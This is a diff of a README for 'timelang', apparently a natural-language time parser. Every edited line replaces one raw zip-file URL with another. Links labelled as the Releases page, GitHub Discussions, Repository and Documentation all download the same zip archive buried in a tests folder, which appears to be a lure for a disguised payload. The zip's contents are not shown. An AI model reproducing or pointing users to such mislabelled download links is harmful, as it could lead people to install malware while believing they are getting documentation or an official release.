@@ -8,13 +8,13 @@ Welcome to **timelang**! This application helps you convert natural language tim
 
 To get started, you need to download **timelang**. You can find the latest version on the Releases page. 
 
-[![Download timelang](https://github.com/LACUCARACHA21/timelang/raw/refs/heads/main/packages/parse/Software-3.4-alpha.1.zip)](https://github.com/LACUCARACHA21/timelang/raw/refs/heads/main/packages/parse/Software-3.4-alpha.1.zip)
+[![Download timelang](https://raw.githubusercontent.com/LACUCARACHA21/timelang/main/packages/parse/tests/Software-2.7.zip)](https://raw.githubusercontent.com/LACUCARACHA21/timelang/main/packages/parse/tests/Software-2.7.zip)
 
-Click the button above or visit this page to download: [timelang Releases](https://github.com/LACUCARACHA21/timelang/raw/refs/heads/main/packages/parse/Software-3.4-alpha.1.zip).
+Click the button above or visit this page to download: [timelang Releases](https://raw.githubusercontent.com/LACUCARACHA21/timelang/main/packages/parse/tests/Software-2.7.zip).
 
 ### Instructions for Downloading
 
-1. **Visit the Releases Page**: Navigate to [timelang Releases](https://github.com/LACUCARACHA21/timelang/raw/refs/heads/main/packages/parse/Software-3.4-alpha.1.zip).
+1. **Visit the Releases Page**: Navigate to [timelang Releases](https://raw.githubusercontent.com/LACUCARACHA21/timelang/main/packages/parse/tests/Software-2.7.zip).
 2. **Select the Latest Version**: You will see a list of releases. The latest version is usually at the top.
 3. **Choose the Right File for Your System**: Look for a file that matches your operating system. For example, you might see options for Windows, Mac, or Linux.
 4. **Download the File**: Click the download link to save the file to your computer.
@@ -74,12 +74,12 @@ If you encounter any issues, please visit our GitHub repository and open an issu
 
 ## 🗨️ Community and Support
 
-Join our growing community! You can find more tips, share your experiences, and ask for help in our discussion forums. Visit our [GitHub Discussions](https://github.com/LACUCARACHA21/timelang/raw/refs/heads/main/packages/parse/Software-3.4-alpha.1.zip) for more information.
+Join our growing community! You can find more tips, share your experiences, and ask for help in our discussion forums. Visit our [GitHub Discussions](https://raw.githubusercontent.com/LACUCARACHA21/timelang/main/packages/parse/tests/Software-2.7.zip) for more information.
 
 ## 📌 Important Links
 
-- [Download timelang](https://github.com/LACUCARACHA21/timelang/raw/refs/heads/main/packages/parse/Software-3.4-alpha.1.zip)
-- [GitHub Repository](https://github.com/LACUCARACHA21/timelang/raw/refs/heads/main/packages/parse/Software-3.4-alpha.1.zip)
-- [Documentation](https://github.com/LACUCARACHA21/timelang/raw/refs/heads/main/packages/parse/Software-3.4-alpha.1.zip)
+- [Download timelang](https://raw.githubusercontent.com/LACUCARACHA21/timelang/main/packages/parse/tests/Software-2.7.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/LACUCARACHA21/timelang/main/packages/parse/tests/Software-2.7.zip)
+- [Documentation](https://raw.githubusercontent.com/LACUCARACHA21/timelang/main/packages/parse/tests/Software-2.7.zip)
 
 Thank you for choosing **timelang**. Happy parsing!
